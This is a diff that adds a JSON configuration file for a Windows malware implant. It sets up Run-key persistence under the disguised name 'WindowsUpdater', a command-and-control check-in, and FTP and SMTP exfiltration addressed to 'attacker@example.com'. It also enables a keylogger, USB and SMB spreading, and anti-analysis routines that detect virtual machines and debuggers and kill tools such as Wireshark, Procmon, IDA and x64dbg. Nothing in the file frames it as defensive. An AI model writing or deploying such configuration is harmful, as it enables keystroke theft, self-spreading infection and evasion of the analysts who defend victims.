@@ -1,0 +1,59 @@
+{
+  "version": "1.0",
+  "persistence": {
+    "registry_key": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "value_name": "WindowsUpdater",
+    "service_name": "WinUpdateService"
+  },
+  "c2_server": {
+    "host": "example.com",
+    "port": 443,
+    "endpoint": "/api/v1/checkin",
+    "heartbeat_interval": 300
+  },
+  "exfiltration": {
+    "ftp_host": "ftp.example.com",
+    "ftp_user": "user",
+    "ftp_pass": "pass",
+    "smtp_server": "smtp.example.com",
+    "smtp_port": 587,
+    "smtp_user": "user@example.com",
+    "smtp_pass": "password",
+    "smtp_recipient": "attacker@example.com"
+  },
+  "ip_blacklisting": {
+    "blacklist_threshold": 5,
+    "blacklist_duration": 86400,
+    "blacklist_urls": [
+      "https://api.example.com/blacklist",
+      "https://another.example.com/report"
+    ]
+  },
+  "keylogger": {
+    "enabled": true,
+    "log_file": "temp\\klog.log",
+    "exfil_interval": 600
+  },
+  "spreading": {
+    "enabled": true,
+    "usb_spread": true,
+    "network_spread": true,
+    "lan_port": 445
+  },
+  "anti_analysis": {
+    "vm_detection": true,
+    "debugger_detection": true,
+    "sandbox_detection": true,
+    "kill_processes": [
+      "wireshark.exe",
+      "procmon.exe",
+      "regmon.exe",
+      "filemon.exe",
+      "procexp.exe",
+      "ida.exe",
+      "ollydbg.exe",
+      "x64dbg.exe",
+      "windbg.exe"
+    ]
+  }
+}
